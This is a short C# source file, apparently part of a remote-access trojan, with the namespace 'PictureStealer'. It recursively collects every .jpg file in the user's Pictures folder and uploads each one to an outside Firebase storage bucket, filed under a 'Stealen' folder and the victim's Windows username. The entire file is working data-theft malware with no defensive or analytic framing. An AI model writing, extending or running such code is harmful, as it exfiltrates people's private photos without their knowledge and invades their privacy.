using Firebase.Storage;
using System;
using System.IO;


namespace PictureStealer
{
    public class Files
    {
        PicturesPath files = new PicturesPath();
        String[] filePaths;
        Stream stream;
        public async void UploadFiles()
        {

            filePaths = Directory.GetFiles(files.GetPicturesPath(), "*.jpg", SearchOption.AllDirectories);

            for(int i = 0; i <= filePaths.Length-1; i++)
            {
                byte[] imgData = System.IO.File.ReadAllBytes(filePaths[i]);
                stream = new System.IO.MemoryStream(imgData);

                //===> uploads images to my firebase cloud storage
                
                var task = new FirebaseStorage("bitxanaxrat.appspot.com")
                           .Child("Stealen")
                           .Child(Environment.UserName)
                           .Child(Path.GetFileName(filePaths[i].ToString()))
                           .PutAsync(stream);

                var result = await task;
                //MessageBox.Show(result);
            }
        }
    }
}
